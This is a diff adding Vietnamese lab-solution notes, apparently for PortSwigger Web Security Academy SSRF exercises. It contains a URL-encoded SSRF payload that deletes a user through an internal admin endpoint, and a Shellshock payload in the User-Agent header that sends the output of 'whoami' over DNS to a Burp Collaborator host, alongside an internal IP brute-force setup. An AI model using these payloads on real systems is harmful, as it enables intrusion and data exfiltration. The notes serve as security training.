@@ -12,4 +12,43 @@
 
 7: (XEM SOLUTION) http%3A%2F%2Flocalhost:80%2523%40stock.weliketoshop.net%2fadmin%2fdelete%3fusername%3dcarlos
 
-8: 
+8: (XEM SOLUTION)
+
+Khi scan lỗi trên Target ta thấy có HTTP phản hồi lại gửi User-Agent cho Burp Collabrator
+
+Thực hiện inject shellshock để in ra username(thay vào giá trị của header User-Agent) : () { :; }; /usr/bin/nslookup $(whoami).3fjjg0y3r30f07jg72gg1m4fb6hx51tq.oastify.com 
+Mục đích là nó sẽ gửi DNS chứa username là domain của Burp Collab.
+Sau đó ta sẽ BruteForce địa chỉ internal server bằng Referer: http://192.168.0.1:8080 cho vào Intruder, đặt payload position và chọn "Numbers" From 1 to 254 Step 1 
+
+GET /product?productId=1 HTTP/1.1
+Host: 0a2e002b038d1fbac145806400740015.web-security-academy.net
+Cookie: session=co7oiOk2RAejBoDZqRPKoAXlvyu1HQFE
+Cache-Control: no-transform
+Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).3fjjg0y3r30f07jg72gg1m4fb6hx51tq.oastify.com
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: 192.168.0.1
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+X-Originating-IP: spoofed.cdtww6r2p2yo9l03zi5dkudcu305utj.oastify.com
+Client-IP: spoofed.ytvics7o5oeap7gpf4lz0gtyapgrbf0.oastify.com
+X-Wap-Profile: http://615qk0fwdwmixfoxnct78o16ixozkn9.oastify.com/wap.xml
+From: root@rfabylthrh03b02i1x7sm9frwi2k08p.oastify.com
+CF-Connecting_IP: spoofed.t2wdlngjejn5y2pkozuu9b2tjkpmoad.oastify.com
+X-Real-IP: spoofed.8clsv2qyoyxk8hzzye49jqc8tzz1zpo.oastify.com
+True-Client-IP: spoofed.c9mws6n2l2uo5lw3vi1dgu9cq3w5xtm.oastify.com
+X-Forwarded-For: spoofed.1y0lhvcrarjdualsk7q25jy1fslunic.oastify.com
+Contact: root@easyt8o4m4vq6nx5wk2fhwaer5x70vp.oastify.com
+X-Client-IP: spoofed.j2m3ldg9e9nvyspaopuk912jjapct0i.oastify.com
+Forwarded: for=spoofed.smic5m0iyi74i19j8yettams3j9le93.oastify.com;by=spoofed.smic5m0iyi74i19j8yettams3j9le93.oastify.com;host=spoofed.smic5m0iyi74i19j8yettams3j9le93.oastify.com
+
+
+Chạy cho đến khi Burp collab nhận được DNS req thì domain cuối của nó chính là username cần nhập
